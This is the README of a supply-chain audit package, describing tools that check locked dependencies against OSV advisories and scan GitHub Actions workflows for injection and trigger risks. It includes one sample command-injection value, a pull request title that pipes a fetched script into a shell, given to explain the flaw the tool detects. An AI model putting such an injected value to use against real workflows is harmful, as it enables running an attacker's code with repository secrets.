# @crewhaus/tool-supplychain

What you depend on, and what runs it.

| Tool | Answers |
|---|---|
| `DependencyAudit` | does anything this project has locked appear in a published advisory |
| `CiWorkflowAudit` | do the workflows that build this project hand an outsider more than they should |

Both are questions with a right answer that a model answers plausibly and
incompletely: it will spot three of the five unpinned actions, and it will
flag `pull_request_target` on a workflow where the trigger is harmless.

## "In an affected range" is not "vulnerable"

`DependencyAudit` asks OSV whether a locked version falls inside a range a
published advisory declares affected. That is all OSV knows, and all this
tool reports.

It **cannot** tell you the vulnerable function is ever called, that the
vulnerable path is not behind a flag that is off, or that the package is
anything other than a build-time dependency that never ships. Determining
that is reachability analysis, and nothing here does it.

So the field names do not imply it:

- `versionInAffectedRange: true` — what OSV actually said.
- `reachabilityAnalyzed: false` — on every match, always, rather than left
  out for a reader to assume either way.
- `matchCount`, `noAdvisoriesMatched` — a count of matches and the absence of
  matches. Not `vulnerabilities` and not `safe`.

`noAdvisoriesMatched: true` means no advisory matched **the packages that
were queried**. Anything listed in `notes` as not audited is not covered by
it, which is why that list exists.

## A failed audit is an error, never a clean report

An unreachable database, a non-2xx status, a body that is not JSON, a
response whose length does not line up with the query — all of these throw,
so the executor returns `isError: true`. A supply-chain report that came back
empty because the network was down, and said so only in a note, is a report a
harness reads as "clean". That failure mode is worth more than the
convenience of a partial answer.

The positional check is the sharp one: `POST /v1/querybatch` returns results
matched to queries **by index**, carrying no package name of their own. A
short or long array is refused rather than zipped, because a supply-chain
report that names the wrong package is worse than one that fails.

## Bounded on purpose

`POST /v1/querybatch` answers with advisory **ids and nothing else**, so
severity, the affected range and the fixed version all live behind a second
request per id. Queries are batched 250 at a time; record fetches are capped
at 300 distinct advisories, six at a time.

Past that cap the match is still reported — it is real — with
`detailsUnavailable` saying the record was **never requested**, which is a
different fact from OSV having been asked and declined. `maxPackages` works
the same way: what was not queried is named in `notes` as not audited rather
than folded into the clean total.

## Severity is computed, because ordering needs a number

Most OSV records carry a CVSS vector and no score. Without a number, "ranked
by severity" degenerates into "in the order the API answered", so the v3.0 and
v3.1 base score is computed here from the vector, by the published formula —
including v3.1's integer `Roundup`, which is not `Math.ceil(x * 10) / 10`.

A **v2 or v4 vector is reported with no score**. The metric letters overlap
(`AV:N` means the same in all three) and the coefficients do not, so running a
v4 vector through the v3 formula produces a number that looks right and is
not.

An advisory with no severity at all sorts last and is **kept**, including by
`minSeverity`. "OSV recorded no severity" is not "not severe", and the count
of those kept is reported as `unratedKeptByFilter`.

## Two rules exist to not fire

The hard part of `CiWorkflowAudit` is not finding the keyword. It is not
firing on the workflows that did the right thing, because a rule a reader
learns to ignore protects nothing.

- **`pull_request_target` alone is not a finding.** It is a finding when the
  workflow also checks out the pull request's own head, which is the
  combination that runs a fork's code with a token holding the base
  repository's secrets. A checkout with no `ref:`, or with
  `${{ github.event.pull_request.base.sha }}`, is the safe shape and is not
  reported. `workflow_run` is the same class and is covered. A `ref:` this
  rule cannot resolve is reported at medium with `conditionalOn` set, rather
  than as either a finding or a pass.
- **`${{ }}` inside `run:` is not a finding either.** `${{ env.FOO }}` is the
  documented remediation. The finding is an attacker-chosen value
  interpolated into the script — the runner substitutes it before the shell
  parses the line, so a pull request titled `"; curl evil.sh | sh; #` becomes
  part of the script rather than an argument to it. References that resolve to
  a commit SHA, an issue number or one of GitHub's own enumerations are not
  reported; an unrecognised `github.event.*` field is reported at high rather
  than assumed safe. `actions/github-script`'s `script:` input is the same
  defect and is covered.

Findings carry the **file, job, step and line** — the line inside a `run:`
block where the interpolation actually is, not the line the `run:` key is on.

## Offline, and honest about what that costs

`CiWorkflowAudit` never resolves a tag to a commit. From the file alone, a tag
and a branch are the same object: a name the action's owner can repoint, which
is how the tj-actions/changed-files compromise reached tens of thousands of
workflows. So `refKind` is `commit-sha` or `mutable`, never "tag" — and the
severity difference between them is only that a branch moves on every push.

`repositoryVisibility` is the other thing the files do not contain. A
self-hosted runner is a finding on a repository outsiders can open pull
requests against and a normal choice on one they cannot. Pass it and the
finding is graded; leave it and the finding carries `conditionalOn`.

## The YAML reader is a subset, and says so

Workflow YAML is read by a parser in this package rather than by a `yaml`
dependency. It covers block mappings and sequences, plain and quoted scalars,
literal and folded block scalars with chomping and explicit indentation
indicators, and flow collections.

**Everything outside that subset produces a warning the tool returns** —
anchors and aliases (which GitHub Actions does not support in workflow files
either), merge keys, a tab in the indentation, a second document, an
unterminated quote or flow collection, a duplicate key. A rule that silently
skipped half a file would report "no findings" on the file it could not read,
so `parseWarnings` is the field to read next to `noFindings: true`.

Two deliberate behaviours:

- `on:` stays the string `on`. A YAML 1.1 loader resolves the bare word to
  the boolean `true`, which is how a round-tripped workflow ends up with a
  literal `true:` key; both spellings are read.
- `run: docker run -p 8080:80 img` is one value. YAML needs a space after the
  colon to open a key, and so does this reader.

Both spellings of a block sequence are read: `- uses:` indented under its key
and `- uses:` at the key's own column, which is the style half of GitHub's own
starter workflows use. A step written as a flow mapping — `- {uses: …, with:
{ref: …}}` — is read as a step rather than as a key spelled `{uses`.

## `noFindings` counts what the rules found, not what survived the filter

`minSeverity` narrows `findings` and `findingCount`. It does not touch
`noFindings`, which reports whether the enabled rules found anything at all in
the files listed; `findingsBelowMinSeverity` says how many the threshold
dropped. A filter must never be able to manufacture a clean answer for a
harness that gates on one field.

Paths are contained the same way whether they were typed or discovered: a
`.github/workflows/x.yml` or a lockfile that is a symlink out of the workspace
is refused either way, and named in `refusedFiles` or in `notes` rather than
read.

## What it does not do

- **No provenance verification.** Checking an npm provenance attestation means
  verifying a Sigstore bundle against the TUF trust root. A hard-coded root
  starts silently accepting — or silently failing — the day the root rotates,
  and a wrong answer about a signature is worse than no answer. Taking
  `@sigstore/verify` as a dependency is a decision for the maintainer, not for
  this package.
- **No lockfile parser.** There is exactly one in this repository, in
  `@crewhaus/tool-code`, and this package imports it. The list of readable
  lockfile names comes from there too, so a widened reader does not leave a
  stale copy here reporting a format as unaudited while it is being audited.
  A lockfile with no reader — `bun.lockb`, `go.sum`, `requirements.txt` —
  is named in `notes` as **NOT audited**.
- **No dataflow.** A tainted value that reaches a `run:` block through a step
  output or an `env:` var read by another action is not traced.
- **No tag resolution, no registry lookup, no network at all** in
  `CiWorkflowAudit`.

## Where requests may go

`DependencyAudit`'s destination is the constant `https://api.osv.dev` — the
public, unauthenticated API, which needs no token, and to which the only thing
that leaves the process is package names and versions.

An `endpoint` override exists for a self-hosted OSV mirror and is gated
**twice**: the origin must be one the operator allow-listed in
`tool_config.fetch.allowed_origins`, and it must still pass the SSRF check
that `@crewhaus/tool-fetch` applies to every outbound request. A URL supplied
by a model that only had to survive an IP check would be an exfiltration
channel whose response lands straight back in the context window. The
allow-list is not a bypass for the SSRF check; both gates run.

## Neighbours

`DependencyList` and `DependencyOutdated` in `@crewhaus/tool-code` compare a
project's declared ranges against its own lockfile and never contact anything.
This package asks an external database a different question. `WorkflowRuns`
and `WorkflowRunLogs` in `@crewhaus/tool-codehost` read what CI *did*;
`CiWorkflowAudit` reads what CI *is*.

## Testing

No test in this package reaches a network. `_setFetch` is exported beside the
tools and every test installs a double through it — including a default that
throws, so a code path that tried to reach OSV would fail loudly rather than
depend on api.osv.dev being up, on the runner having egress, and on somebody
else's rate limit.
